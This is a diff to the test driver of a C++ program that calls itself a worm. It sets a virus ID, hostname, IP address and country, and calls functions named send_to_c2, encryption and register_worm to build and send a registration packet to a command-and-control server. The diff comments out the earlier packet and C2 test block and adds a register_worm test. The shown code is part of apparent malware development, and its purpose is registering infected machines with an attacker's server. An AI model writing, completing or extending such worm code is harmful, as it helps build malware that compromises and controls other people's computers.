@@ -13,12 +13,12 @@ int main()
 	
     cout << "Worm initalized ... \n\n";
 	char insert_key = 'A'; 
-	const char* virus_id = "firstviru"; 
-	const char* hostname = "dakota"; 
-	const char* ip = "10.2.0.14"; 
-	const char* country = "US";
+	char virus_id[] = "firstviru"; 
+	char hostname[] = "dakota"; 
+	char ip[] = "104.26.12.54";
+	char country[] = "US";
 
-	
+	/*
 	char* packet = structure_init_message(insert_key, virus_id, hostname, ip, country);
 	cout << "the packet is " << packet << endl; 
 
@@ -33,12 +33,19 @@ int main()
 	cout << endl << endl << "Testing the Send_to_c2 server function: " << endl;
 	int response = send_to_c2(packet, sock); 
 
+	cout << endl << endl;
 
 	// Test the functions here
 
 	cout << "Encryption:" << encryption(packet) << endl;
 	char* result = encryption(packet);
     fwrite(result, 32, 1, stdout);
+
+	*/
+	cout << endl << endl; 
+
+	cout << "Testing register_worm function: " << endl; 
+	int result = register_worm(insert_key, virus_id, hostname, ip, country); 
 
 
 	//cout << "Decryption:" << decryption(result) << endl;
